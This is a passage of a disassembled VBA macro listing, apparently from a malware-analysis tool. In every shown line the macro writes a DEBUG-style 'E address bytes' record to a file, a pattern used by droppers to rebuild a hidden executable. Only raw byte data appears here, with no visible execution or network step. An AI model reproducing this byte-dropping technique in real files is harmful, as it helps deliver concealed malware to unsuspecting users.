' 	LitStr 0x0036 "E 7C30 42 6E 3E 49 75 54 5F 8B 61 6B 9A 5D 69 99 6A 75"
' 	PrintItemNL 
' Line #2182:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C40 A9 75 7F B5 7A 84 BA 6F 7C B0 66 74 A5 6C 7A AA"
' 	PrintItemNL 
' Line #2183:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C50 77 86 B4 7D 8D B8 6B 7B A9 5F 6F 9E 51 61 90 4B"
' 	PrintItemNL 
' Line #2184:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C60 5A 8B 48 59 8C 46 57 8A 3F 50 83 38 49 7C 37 48"
' 	PrintItemNL 
' Line #2185:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C70 79 2E 41 6E 26 38 61 24 37 5C 2E 40 5F 33 46 61"
' 	PrintItemNL 
' Line #2186:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C80 30 41 5B 22 36 4F 20 35 50 37 4E 68 31 49 61 48"
' 	PrintItemNL 
' Line #2187:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7C90 60 78 47 5F 75 4A 63 77 41 5A 6E 4C 66 77 3F 59"
' 	PrintItemNL 
' Line #2188:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7CA0 6A 5C 76 87 66 80 91 3F 59 6A 3E 57 6B 37 50 64"
' 	PrintItemNL 
' Line #2189:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7CB0 4E 67 7B 68 81 95 76 91 A6 48 63 78 4D 66 7A 67"
' 	PrintItemNL 
' Line #2190:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7CC0 80 94 5C 74 88 63 7B 8F 6F 88 9C 44 5F 73 47 63"
' 	PrintItemNL 
' Line #2191:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7CD0 74 62 80 91 70 8D 9C 75 8F 9F 84 9D AD 8A 9E AF"
' 	PrintItemNL 
' Line #2192:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7CE0 79 8B 9C 6C 79 89 67 6A 78 3D 3C 45 4A 44 49 60"
' 	PrintItemNL 
' Line #2193:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7CF0 5A 5B 64 5F 60 06 01 02 00 00 F7 F5 F4 EE EC EB"
' 	PrintItemNL 
' Line #2194:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D00 E5 E2 DE D3 D0 CC C4 C2 C1 B8 B8 B8 00 01 02 E9"
' 	PrintItemNL 
' Line #2195:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D10 EF F4 E0 EA F4 E1 EE FC D7 E7 F7 BD CF E0 A7 BB"
' 	PrintItemNL 
' Line #2196:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D20 CD BB CF E1 CE E0 F1 A9 BF D1 8B A3 BB 7F 99 B1"
' 	PrintItemNL 
' Line #2197:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D30 59 71 89 31 48 5E 31 46 5B 66 7B 90 53 68 7D 45"
' 	PrintItemNL 
' Line #2198:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D40 5A 70 35 4B 64 3B 50 6B 2E 45 5F 21 38 52 35 49"
' 	PrintItemNL 
' Line #2199:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D50 62 20 35 4B 11 21 38 17 25 3B 30 3D 53 1C 25 39"
' 	PrintItemNL 
' Line #2200:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D60 11 17 24 06 0B 14 00 00 09 00 00 0A 16 23 39 4E"
' 	PrintItemNL 
' Line #2201:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D70 5D 7D 43 54 7B 45 55 80 5B 6B 96 7F 8C B8 8B 98"
' 	PrintItemNL 
' Line #2202:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D80 C4 83 90 BC 74 85 B0 63 74 9F 5E 6C 96 48 54 7C"
' 	PrintItemNL 
' Line #2203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7D90 32 3E 66 2B 37 5F 34 40 68 47 56 7D 5A 67 93 5F"
' 	PrintItemNL 
' Line #2204:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7DA0 6C 9A 62 6D 9F 69 75 AB 75 81 B7 79 85 BB 78 85"
' 	PrintItemNL 
' Line #2205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7DB0 B9 7D 8B BC 7E 8C BC 76 85 B3 5D 6D 9C 50 60 8F"
' 	PrintItemNL 
' Line #2206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7DC0 43 52 83 3E 4D 7E 3E 4F 82 40 51 84 3B 4C 7F 35"
' 	PrintItemNL 
' Line #2207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7DD0 46 77 32 44 73 2A 3D 6A 27 39 62 26 39 5E 2E 40"
' 	PrintItemNL 
' Line #2208:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7DE0 5F 35 47 64 31 42 5D 1F 33 4C 22 37 52 34 4B 65"
' 	PrintItemNL 
' Line #2209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7DF0 2C 44 5C 45 5D 75 48 60 76 49 62 76 41 5A 6E 4D"
' 	PrintItemNL 
' Line #2210:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E00 67 78 43 5D 6E 5F 79 8A 57 71 82 3B 55 66 3E 57"
' 	PrintItemNL 
' Line #2211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E10 6B 40 59 6D 59 72 86 70 89 9D 74 8F A4 44 5F 74"
' 	PrintItemNL 
' Line #2212:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E20 55 6E 82 64 7D 91 55 6D 81 66 7E 92 6C 85 99 4B"
' 	PrintItemNL 
' Line #2213:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E30 66 7A 53 6F 80 68 86 97 6E 8B 9A 73 8D 9D 7E 97"
' 	PrintItemNL 
' Line #2214:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E40 A7 80 94 A5 72 84 95 64 71 81 36 3A 45 5F 5F 65"
' 	PrintItemNL 
' Line #2215:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E50 50 4B 4D 4D 48 47 52 4E 4D 0C 09 05 00 00 F7 F5"
' 	PrintItemNL 
' Line #2216:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E60 F4 EE EC EB E6 E3 DF D3 D0 CC C3 C2 BE B8 B9 B7"
' 	PrintItemNL 
' Line #2217:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E70 00 02 03 EB F1 F6 E2 EC F6 DB E8 F6 DB EB FB D6"
' 	PrintItemNL 
' Line #2218:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E80 E8 F9 B8 CC DE B6 CA DC CE E0 F1 C3 D9 EB 8D A5"
' 	PrintItemNL 
' Line #2219:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7E90 BD 85 9F B7 62 7A 92 35 4C 62 29 3E 53 5D 72 87"
' 	PrintItemNL 
' Line #2220:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7EA0 53 68 7D 4B 60 76 39 4F 68 3E 53 6E 2E 45 5F 20"
' 	PrintItemNL 
' Line #2221:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7EB0 37 51 36 4A 63 1F 34 4A 0E 1E 35 16 24 3A 31 3B"
' 	PrintItemNL 
' Line #2222:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7EC0 53 1D 23 3A 0A 0D 1C 06 08 13 00 00 08 00 00 0B"
' 	PrintItemNL 
' Line #2223:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7ED0 2A 36 4E 46 55 76 41 51 7B 49 59 87 68 77 A5 82"
' 	PrintItemNL 
' Line #2224:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7EE0 91 BF 86 95 C3 7B 8A B8 65 78 A5 5B 6E 99 5C 6E"
' 	PrintItemNL 
' Line #2225:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7EF0 93 4A 5B 7C 39 4A 6B 2B 3C 5D 21 32 53 2A 3A 5E"
' 	PrintItemNL 
' Line #2226:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F00 3F 4E 75 48 58 83 5A 68 98 62 6F A3 70 7C B2 77"
' 	PrintItemNL 
' Line #2227:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F10 85 BA 77 85 B9 78 88 B7 6F 7F AD 5B 6B 99 4B 5B"
' 	PrintItemNL 
' Line #2228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F20 8A 47 56 87 42 50 84 41 4F 83 3F 50 83 3E 4F 82"
' 	PrintItemNL 
' Line #2229:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F30 3B 4C 7D 38 49 7A 33 45 74 25 38 63 20 32 5B 23"
' 	PrintItemNL 
' Line #2230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F40 36 5B 2B 3C 5D 33 45 62 35 46 61 28 3B 56 26 3B"
' 	PrintItemNL 
' Line #2231:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F50 56 32 49 63 27 3F 57 44 5C 74 49 61 77 49 62 76"
' 	PrintItemNL 
' Line #2232:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F60 3F 58 6C 4E 68 79 46 60 71 60 7A 8B 48 62 73 3F"
' 	PrintItemNL 
' Line #2233:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F70 59 6A 41 5A 6E 4C 65 79 61 7A 8E 73 8C A0 6D 88"
' 	PrintItemNL 
' Line #2234:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F80 9D 47 62 77 60 79 8D 5F 78 8C 4E 66 7A 69 81 95"
' 	PrintItemNL 
' Line #2235:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7F90 6A 83 97 4E 69 7D 5E 7A 8B 59 77 88 57 74 83 6D"
' 	PrintItemNL 
' Line #2236:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7FA0 87 97 7B 94 A4 6E 82 93 5F 71 82 5B 68 76 47 4E"
' 	PrintItemNL 
' Line #2237:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7FB0 57 49 4A 4E 4C 47 48 44 3F 3E 49 46 42 04 04 00"
' 	PrintItemNL 
' Line #2238:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7FC0 00 00 F5 F6 F4 EC ED EB E4 E2 E1 D1 CF CE C3 C1"
' 	PrintItemNL 
' Line #2239:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7FD0 C0 B8 B8 B8 00 02 03 EB F1 F6 DE E9 F1 BE CC D8"
' 	PrintItemNL 
' Line #2240:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7FE0 B6 C7 D4 CC DF EE C6 D8 E9 B5 C7 D8 BE D0 E1 C0"
' 	PrintItemNL 
' Line #2241:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 7FF0 D4 E5 94 AD C1 8A A5 BA 6A 82 98 3A 51 67 23 3B"
' 	PrintItemNL 
' Line #2242:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8000 4F 57 6F 83 57 6C 81 51 66 7B 3E 52 6B 40 56 6F"
' 	PrintItemNL 
' Line #2243:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8010 2F 44 5F 21 36 51 36 49 64 20 31 4B 0D 1D 34 17"
' 	PrintItemNL 
' Line #2244:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8020 24 3A 25 30 46 15 1C 2F 02 05 13 0B 0B 17 00 00"
' 	PrintItemNL 
' Line #2245:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8030 0D 00 02 15 47 52 6E 4C 5A 7E 54 64 8F 4C 5C 8B"
' 	PrintItemNL 
' Line #2246:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8040 5C 6A 9B 71 7F B0 85 93 C4 86 95 C6 6A 7C AB 5A"
' 	PrintItemNL 
' Line #2247:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8050 6D 9A 51 62 89 51 61 86 4C 5C 80 37 47 6B 1B 2B"
' 	PrintItemNL 
' Line #2248:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8060 50 19 29 4E 26 36 60 2C 3C 67 2C 3A 6A 48 56 87"
' 	PrintItemNL 
' Line #2249:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8070 68 75 A9 6F 7D B1 69 77 A8 69 77 A7 61 70 9E 4C"
' 	PrintItemNL 
' Line #2250:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8080 5B 89 42 52 81 46 55 86 4B 59 8D 4B 59 8D 47 55"
' 	PrintItemNL 
' Line #2251:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8090 89 3F 50 83 3E 4C 80 3C 4D 7E 39 49 78 22 32 60"
' 	PrintItemNL 
' Line #2252:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 80A0 17 28 53 1C 2F 55 23 36 57 2F 44 60 39 4C 67 35"
' 	PrintItemNL 
' Line #2253:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 80B0 4B 64 2B 40 5B 33 4A 64 25 3D 55 44 5C 74 49 61"
' 	PrintItemNL 
' Line #2254:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 80C0 77 47 5F 75 3C 55 69 4C 66 77 47 61 72 5F 79 8A"
' 	PrintItemNL 
' Line #2255:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 80D0 40 5A 6B 43 5D 6E 43 5C 70 54 6D 81 64 7D 91 74"
' 	PrintItemNL 
' Line #2256:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 80E0 8D A1 65 7E 92 4B 64 78 69 82 96 5F 77 8B 4D 65"
' 	PrintItemNL 
' Line #2257:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 80F0 79 6E 86 9A 69 82 96 50 69 7D 73 8F A0 59 75 86"
' 	PrintItemNL 
' Line #2258:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8100 51 6D 7E 7C 96 A6 8E A7 B7 70 84 95 5D 6F 80 63"
' 	PrintItemNL 
' Line #2259:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8110 70 7E 77 7E 87 4A 4D 51 48 46 46 53 4F 4E 57 56"
' 	PrintItemNL 
' Line #2260:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8120 52 02 01 00 00 00 F3 F6 F4 EE F1 EF DD DE DC D6"
' 	PrintItemNL 
' Line #2261:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8130 D6 D6 C2 C2 C2 B5 B7 B8 00 02 06 B4 BA BF AB B7"
' 	PrintItemNL 
' Line #2262:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8140 BD A8 B8 BF A4 B5 BE C3 D5 E0 B8 C9 D6 B0 C1 CE"
' 	PrintItemNL 
' Line #2263:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8150 C1 D2 DF C4 D7 E6 AA C1 D0 82 9B AB 6F 88 9C 4C"
' 	PrintItemNL 
' Line #2264:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8160 65 79 2C 44 5A 43 5C 70 5D 72 87 59 6C 81 41 54"
' 	PrintItemNL 
' Line #2265:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8170 69 44 56 6D 30 43 5E 25 37 54 2E 40 5D 17 25 41"
' 	PrintItemNL 
' Line #2266:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8180 14 20 38 1B 26 3A 23 32 42 0A 18 24 06 0A 15 03"
' 	PrintItemNL 
' Line #2267:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8190 04 12 00 00 0E 1D 21 3D 54 5D 82 52 60 8A 5B 68"
' 	PrintItemNL 
' Line #2268:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 81A0 96 5F 6B 9B 5E 69 9D 5F 6B A1 66 71 AA 77 83 B9"
' 	PrintItemNL 
' Line #2269:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 81B0 69 74 A8 66 71 A3 62 70 A1 57 65 96 4F 5D 8D 4E"
' 	PrintItemNL 
' Line #2270:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 81C0 5C 8C 4C 5A 8A 26 34 64 00 02 32 00 00 31 1B 26"
' 	PrintItemNL 
' Line #2271:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 81D0 58 2F 3A 6C 50 5B 8D 68 76 A6 64 70 A0 4B 58 86"
' 	PrintItemNL 
' Line #2272:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 81E0 41 4E 7C 45 52 80 53 61 91 52 60 91 4F 5D 8E 4B"
' 	PrintItemNL 
' Line #2273:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 81F0 59 8A 4A 57 8B 49 57 8B 46 53 87 40 4E 82 39 46"
' 	PrintItemNL 
' Line #2274:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8200 7A 28 37 68 1B 2B 59 17 29 52 1B 2F 52 3B 51 6D"
' 	PrintItemNL 
' Line #2275:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8210 3A 52 6A 35 4D 63 2A 42 5A 2F 47 5F 2E 46 5E 4A"
' 	PrintItemNL 
' Line #2276:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8220 62 7A 4B 63 79 3D 55 6B 3B 53 69 4B 64 78 4D 66"
' 	PrintItemNL 
' Line #2277:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8230 7A 54 6D 81 42 5B 6F 44 5D 71 4A 64 75 62 7C 8D"
' 	PrintItemNL 
' Line #2278:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8240 6F 89 9A 6B 85 96 51 6A 7A 56 6F 7F 70 89 99 5D"
' 	PrintItemNL 
' Line #2279:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8250 75 87 55 6D 7F 71 89 9B 61 7A 8E 5A 73 87 6C 85"
' 	PrintItemNL 
' Line #2280:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8260 99 4C 66 77 5A 74 85 88 A1 B1 79 90 A0 63 7A 89"
' 	PrintItemNL 
' Line #2281:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8270 69 7E 8D 4F 5F 6B 87 8E 97 5B 5E 63 43 42 44 58"
' 	PrintItemNL 
' Line #2282:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8280 56 56 4B 4C 4A 07 08 06 00 00 F3 F8 F6 EC F1 EF"
' 	PrintItemNL 
' Line #2283:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8290 D9 DB DB D1 D3 D3 C0 C2 C3 B4 B8 B9 00 00 04 A9"
' 	PrintItemNL 
' Line #2284:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 82A0 AF B4 C3 CF D5 D2 E2 E8 B8 C9 D2 BA CD D5 BB CD"
' 	PrintItemNL 
' Line #2285:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 82B0 D8 B1 C3 CE B3 C3 D0 C1 D2 DF B2 C8 D4 8C A6 B4"
' 	PrintItemNL 
' Line #2286:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 82C0 6F 89 9A 55 70 84 44 5F 74 4F 67 7D 56 6B 80 58"
' 	PrintItemNL 
' Line #2287:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 82D0 6C 7E 49 5A 6F 45 57 6E 31 42 5D 25 37 54 30 40"
' 	PrintItemNL 
' Line #2288:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 82E0 5D 17 25 41 17 21 39 21 2D 3F 1C 2D 3A 08 19 22"
' 	PrintItemNL 
' Line #2289:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 82F0 07 0D 18 00 00 0B 00 00 12 2E 33 54 5C 65 90 51"
' 	PrintItemNL 
' Line #2290:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8300 60 8E 52 5F 8D 62 6E 9E 68 73 A7 56 62 98 39 45"
' 	PrintItemNL 
' Line #2291:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8310 7F 5B 66 9F 88 90 C5 8E 97 C9 91 9D D3 89 96 CE"
' 	PrintItemNL 
' Line #2292:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8320 78 84 BA 69 75 AB 73 7F B5 73 7F B5 5C 69 9D 59"
' 	PrintItemNL 
' Line #2293:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8330 66 9A 69 74 A6 58 63 95 47 52 84 4F 5B 8B 47 53"
' 	PrintItemNL 
' Line #2294:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8340 83 35 42 70 47 53 83 5E 6A 9A 57 65 96 54 62 93"
' 	PrintItemNL 
' Line #2295:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8350 55 62 96 56 63 97 50 5D 91 47 54 88 48 54 8A 50"
' 	PrintItemNL 
' Line #2296:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8360 5C 92 3E 4A 80 2C 39 6D 1C 2C 5B 14 25 50 14 2A"
' 	PrintItemNL 
' Line #2297:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8370 4E 36 4E 6C 3A 54 6C 39 54 69 2C 44 5C 2F 47 5F"
' 	PrintItemNL 
' Line #2298:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8380 2A 42 5A 44 5C 74 48 60 76 41 59 6F 41 59 6F 4E"
' 	PrintItemNL 
' Line #2299:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8390 66 7C 52 6B 7F 56 6F 83 43 5C 70 47 60 74 50 6A"
' 	PrintItemNL 
' Line #2300:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 83A0 7B 6C 86 97 73 8D 9E 60 7A 8A 51 68 78 5E 75 84"
' 	PrintItemNL 
' Line #2301:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 83B0 70 87 97 68 81 91 52 6A 7C 72 8A 9C 5F 78 8C 60"
' 	PrintItemNL 
' Line #2302:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 83C0 79 8D 5A 73 87 3F 59 6A 66 7E 90 8E A7 B7 8C A3"
' 	PrintItemNL 
' Line #2303:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 83D0 B2 91 A8 B7 9D B3 BF 9B AB B7 B2 BB C4 4B 4F 54"
' 	PrintItemNL 
' Line #2304:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 83E0 18 1A 1B 50 50 50 64 64 64 00 00 00 00 00 F7 FC"
' 	PrintItemNL 
' Line #2305:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 83F0 FA EE F3 F1 D8 DA DA CD CF CF C1 C3 C4 BA BE BF"
' 	PrintItemNL 
' Line #2306:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8400 00 01 06 AC B2 B7 BB C7 CD DC EC F2 BD CE D7 B6"
' 	PrintItemNL 
' Line #2307:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8410 C9 D1 CE E0 EB CF E1 EC BC CC D9 C3 D4 E1 BE D2"
' 	PrintItemNL 
' Line #2308:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8420 DD 95 AD B9 60 7A 8B 47 62 76 48 63 78 53 6B 81"
' 	PrintItemNL 
' Line #2309:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8430 4F 67 7B 53 66 7B 51 62 77 44 56 6D 31 42 5D 24"
' 	PrintItemNL 
' Line #2310:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8440 36 53 30 41 5C 1A 27 41 16 21 37 28 34 46 25 36"
' 	PrintItemNL 
' Line #2311:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8450 43 09 19 25 0A 10 1D 00 00 0F 06 08 26 47 4D 72"
' 	PrintItemNL 
' Line #2312:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8460 5D 6A 96 54 64 93 5D 6B 9B 63 71 A1 6A 77 AB 64"
' 	PrintItemNL 
' Line #2313:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8470 70 A6 3F 4C 84 63 71 A6 AB B7 E7 B5 BF EF AE BA"
' 	PrintItemNL 
' Line #2314:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8480 F0 B6 C1 FA A3 AF E5 7D 89 BF 79 85 BB 8A 96 CC"
' 	PrintItemNL 
' Line #2315:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 8490 90 9D D1 95 A2 D6 8E 9B CF 6F 7D AE 37 45 76 2A"
' 	PrintItemNL 
' Line #2316:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 84A0 38 69 33 41 72 42 50 80 60 6E 9F 62 70 A1 62 6F"
' 	PrintItemNL 
' Line #2317:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 84B0 A3 62 70 A4 64 72 A7 65 73 A8 60 6E A3 56 64 99"
' 	PrintItemNL 
' Line #2318:
' 	Ld hFile 
